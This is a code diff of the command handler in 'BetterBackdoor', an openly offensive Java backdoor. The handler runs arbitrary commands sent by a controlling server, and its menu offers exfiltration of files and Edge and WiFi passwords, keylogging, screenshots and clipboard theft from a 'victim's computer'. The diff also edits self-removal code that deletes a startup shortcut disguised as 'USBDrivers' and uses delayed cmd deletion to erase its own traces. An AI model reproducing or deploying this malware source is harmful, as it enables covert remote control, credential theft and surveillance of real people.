@@ -1,7 +1,6 @@
 package com.github.thatcherdev.betterbackdoor.backdoor;
 
 import java.util.Scanner;
-import org.apache.commons.io.FileUtils;
 import java.awt.datatransfer.DataFlavor;
 import java.awt.Rectangle;
 import java.awt.Robot;
@@ -18,9 +17,9 @@ import com.github.thatcherdev.betterbackdoor.backend.Utils;
 public class HandleCommand {
 
 	/**
-	 * Handles commands given to backdoor by setting {@link send} to appropriate
-	 * response. {@link Backdoor.out} is then used to send response followed by a
-	 * token to signal end of response.
+	 * Handles commands given to backdoor and sets {@link send} to appropriate
+	 * response. {@link Backdoor#out} is then used to send the response followed by
+	 * a token to signal end of response.
 	 *
 	 * @param command command given to backdoor from server
 	 */
@@ -30,8 +29,9 @@ public class HandleCommand {
 			send = "[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
 					+ "[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
 					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
-					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer\n[cb] Get text currently copied to victim's clipboard\n"
-					+ "[cat] Get data of a file on victim's computer\n[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit";
+					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer\n"
+					+ "[cb] Get text currently copied to victim's clipboard\n[cat] Get data of a file on victim's computer\n"
+					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit";
 		else if (command.startsWith("cmd"))
 			send = Utils.runCommand(command.substring(4));
 		else if (command.startsWith("ps"))
@@ -72,7 +72,6 @@ public class HandleCommand {
 				send = "An error occurred when trying to receive file";
 		} else if (command.equals("keylog")) {
 			Thread keyLogger = new Thread() {
-				@Override
 				public void run() {
 					KeyLogger.start();
 				}
@@ -113,17 +112,8 @@ public class HandleCommand {
 			}
 		} else if (command.equals("remove")) {
 			try {
-				if (new File("C:\\Users\\" + System.getProperty("user.name")
-						+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk")
-								.exists())
-					FileUtils.forceDelete(new File("C:\\Users\\" + System.getProperty("user.name")
-							+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk"));
-				if (new File("USBDrivers.jar").exists())
-					Runtime.getRuntime().exec(
-							"cmd /c ping localhost -n 5 > nul && del /f /q USBDrivers.jar USBDrivers.vbs && rd /s /q gathered jre scripts && cd.. && rd /s /q USBDrivers");
-				if (new File("run.jar").exists())
-					Runtime.getRuntime().exec(
-							"cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat install.jar install.bat && rd /s /q gathered jre scripts");
+				Runtime.getRuntime().exec(
+						"cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat && rd /s /q gathered scripts jre");
 				System.exit(0);
 			} catch (Exception e) {
 				send = "An error occurred when trying to remove files:\n" + e.getMessage();
